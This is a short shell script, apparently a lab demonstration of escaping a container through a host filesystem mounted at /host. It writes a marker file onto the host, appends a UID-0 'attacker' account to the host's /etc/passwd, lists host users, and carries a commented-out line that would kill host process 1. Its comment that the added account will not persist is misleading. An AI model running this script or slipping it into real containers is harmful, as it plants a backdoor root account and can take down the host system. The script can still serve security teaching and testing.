#!/bin/sh

echo "[*] Starting container escape simulation..."

# Change to host root
cd /host || { echo "[!] Host FS not mounted under /host"; exit 1; }

# Create a file on the host to prove access
echo "[*] Writing to host filesystem..."
echo "Container escape successful at $(date)" >> /host/tmp/escaped_by_container.txt

# Try adding a new host user (simulated, won't persist without PAM interaction)
echo "[*] Simulating privilege abuse by modifying /etc/passwd..."
echo 'attacker:x:0:0:attacker:/root:/bin/bash' >> /host/etc/passwd

# Optional: attempt to kill host processes (DON'T run in real env)
# echo "[*] Killing a host process (simulation)"
# chroot /host kill -9 1  # dangerous! DO NOT UNCOMMENT unless in isolated lab

# Output host user list
echo "[*] Listing host users:"
cat /host/etc/passwd | tail -n 5

echo "[+] Escape simulation complete."
